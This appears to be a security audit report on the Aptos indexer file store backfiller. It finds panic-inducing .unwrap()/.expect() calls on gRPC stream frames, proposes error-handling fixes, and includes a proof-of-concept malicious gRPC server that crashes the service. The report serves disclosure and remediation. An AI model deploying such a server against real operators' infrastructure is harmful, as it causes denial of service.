# Audit Report

## Title
Malicious Fullnode Can Crash Indexer File Store Backfiller via Malformed gRPC Stream

## Summary
The indexer-grpc-file-store-backfiller contains multiple unguarded `.expect()` and `.unwrap()` calls when processing gRPC stream responses from a potentially untrusted fullnode. A malicious fullnode can crash the backfiller service by sending either an empty stream or messages with unset `response` fields, triggering panic-based denial of service.

## Finding Description

The backfiller connects to an externally configured fullnode via gRPC to retrieve historical transaction data. The vulnerability exists in the `backfill()` function where the code unsafely handles the gRPC stream responses. [1](#0-0) 

At the stream initialization, the code contains two critical unsafe operations:
1. `.expect("Failed to get the first frame")` - panics if the stream is empty (returns `None`)
2. `.response.unwrap()` - panics if the `response` field is `None` [2](#0-1) 

Additionally, the main streaming loop contains similar vulnerabilities where subsequent frames are unsafely unwrapped without proper error handling.

The protobuf definition shows that `response` is an optional field (`Option<Response>`): [3](#0-2) 

While legitimate fullnode implementations always set this field: [4](#0-3) 

A malicious fullnode is not bound by this implementation and can craft protobuf messages with `response = None` or simply close the stream immediately.

**Attack Propagation:**
1. Operator configures backfiller with `fullnode_grpc_address` pointing to a malicious or compromised fullnode [5](#0-4) 

2. Backfiller initiates gRPC connection and requests transactions [6](#0-5) 

3. Malicious fullnode responds with either:
   - Empty stream (closes connection immediately) → panic at line 157
   - Message with `response = None` → panic at line 159 or 276
   - Closes stream unexpectedly during operation → panic at line 267

4. Backfiller process crashes with unrecoverable panic

## Impact Explanation

This vulnerability meets the **High Severity** criteria per the Aptos Bug Bounty Program, specifically under "API crashes" (up to $50,000). The backfiller is a critical indexer infrastructure component responsible for historical data backfilling. A crash results in:

- **Service unavailability**: Backfiller process terminates and requires restart
- **Data indexing disruption**: Historical transaction data cannot be backfilled
- **Operational overhead**: Requires manual intervention to restart service
- **Potential data gaps**: If crashes occur during critical backfill operations

While this doesn't directly affect consensus or validator operations, it impacts the availability of indexer infrastructure that many ecosystem applications rely on for historical blockchain data.

## Likelihood Explanation

**Likelihood: Medium to High**

The vulnerability is easily exploitable if any of the following conditions are met:

1. **Compromised Fullnode**: Attacker gains control over a fullnode that backfillers connect to
2. **Configuration Error**: Operator mistakenly configures backfiller to connect to attacker-controlled server
3. **Man-in-the-Middle**: Network-level interception of gRPC traffic (if TLS not properly configured)
4. **Supply Chain**: Malicious fullnode operator intentionally sends malformed responses

The attack requires no special privileges, cryptographic operations, or timing constraints. A simple gRPC server that sends empty streams or malformed messages is sufficient. The code will deterministically panic upon receiving such input.

## Recommendation

Replace all unsafe `.expect()` and `.unwrap()` calls with proper error handling using pattern matching and graceful error propagation. The backfiller should handle protocol violations from potentially untrusted fullnodes defensively.

**Fixed code for initialization:**
```rust
let init_frame = match grpc_stream.next().await {
    Some(Ok(response)) => match response.response {
        Some(resp) => resp,
        None => anyhow::bail!("First frame has no response field"),
    },
    Some(Err(e)) => anyhow::bail!("gRPC error on first frame: {:?}", e),
    None => anyhow::bail!("Stream ended before first frame"),
};
```

**Fixed code for main loop:**
```rust
let item = match grpc_stream.next().await {
    Some(item) => item,
    None => {
        tracing::warn!("Stream ended unexpectedly");
        break;
    },
};
let response = match item {
    Ok(response) => response,
    Err(e) => {
        tracing::error!("Failed to get response: {:?}", e);
        anyhow::bail!("gRPC stream error: {:?}", e);
    },
};

let resp = match response.response {
    Some(r) => r,
    None => anyhow::bail!("Response frame has no response field"),
};
```

This pattern is already used correctly in the cache-worker component: [7](#0-6) 

## Proof of Concept

```rust
// Mock malicious gRPC server that crashes the backfiller
use tokio::sync::mpsc;
use tonic::{Request, Response, Status};
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    GetTransactionsFromNodeRequest,
    TransactionsFromNodeResponse,
};

pub struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = 
        tokio_stream::wrappers::ReceiverStream<Result<TransactionsFromNodeResponse, Status>>;

    async fn get_transactions_from_node(
        &self,
        _request: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        let (tx, rx) = mpsc::channel(1);
        
        tokio::spawn(async move {
            // Attack 1: Send message with response = None (panics at line 159)
            let malformed_response = TransactionsFromNodeResponse {
                response: None,  // This will cause unwrap() panic
                chain_id: 1,
            };
            let _ = tx.send(Ok(malformed_response)).await;
            
            // Attack 2: Close stream immediately (empty stream panics at line 157)
            // Simply don't send anything and drop tx
        });
        
        Ok(Response::new(tokio_stream::wrappers::ReceiverStream::new(rx)))
    }
    
    async fn ping(
        &self,
        _request: Request<PingFullnodeRequest>,
    ) -> Result<Response<PingFullnodeResponse>, Status> {
        Ok(Response::new(PingFullnodeResponse { info: None }))
    }
}

// To reproduce:
// 1. Run this malicious gRPC server on localhost:50051
// 2. Configure backfiller with fullnode_grpc_address = "http://localhost:50051"
// 3. Start backfiller
// 4. Observe immediate panic: "thread panicked at 'called `Option::unwrap()` on a `None` value'"
```

**Notes:**

This vulnerability demonstrates a failure to apply defensive programming practices when handling external, potentially untrusted input. The backfiller assumes the fullnode will always behave according to specification, but in a distributed system with configurable endpoints, this assumption is dangerous. The issue is exacerbated by the use of panic-based error handling (`.expect()`, `.unwrap()`) rather than graceful error propagation, making the service fragile to any protocol deviation or malicious input.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L105-114)
```rust
        // Create a grpc client to the fullnode.
        let mut grpc_client = create_grpc_client(fullnode_grpc_address.clone()).await;
        let request = tonic::Request::new(GetTransactionsFromNodeRequest {
            starting_version: Some(expected_starting_version),
            transactions_count,
        });
        let stream = grpc_client
            .get_transactions_from_node(request)
            .await?
            .into_inner();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L153-159)
```rust
        let mut grpc_stream = self.grpc_stream.take().expect("Stream is not initialized.");
        let init_frame = grpc_stream
            .next()
            .await
            .expect("Failed to get the first frame")?
            .response
            .unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L265-276)
```rust
        loop {
            let item = grpc_stream.next().await;
            let item = item.unwrap();
            let response = match item {
                Ok(response) => response,
                Err(e) => {
                    tracing::error!("Failed to get response: {:?}", e);
                    panic!("Failed to get response: {:?}", e);
                },
            };

            let resp = response.response.unwrap();
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L79-84)
```rust
pub struct TransactionsFromNodeResponse {
    /// Making sure that all the responses include a chain id
    #[prost(uint32, tag="3")]
    pub chain_id: u32,
    #[prost(oneof="transactions_from_node_response::Response", tags="1, 2")]
    pub response: ::core::option::Option<transactions_from_node_response::Response>,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L245-261)
```rust
pub fn get_status(
    status_type: StatusType,
    start_version: u64,
    end_version: Option<u64>,
    ledger_chain_id: u8,
) -> TransactionsFromNodeResponse {
    TransactionsFromNodeResponse {
        response: Some(transactions_from_node_response::Response::Status(
            StreamStatus {
                r#type: status_type as i32,
                start_version,
                end_version,
            },
        )),
        chain_id: ledger_chain_id as u32,
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/lib.rs (L15-17)
```rust
pub struct IndexerGrpcFileStoreBackfillerConfig {
    pub file_store_config: IndexerGrpcFileStoreConfig,
    pub fullnode_grpc_address: Url,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L338-343)
```rust
    let init_signal = match resp_stream.next().await {
        Some(Ok(r)) => r,
        _ => {
            bail!("[Indexer Cache] Streaming error: no response.");
        },
    };
```
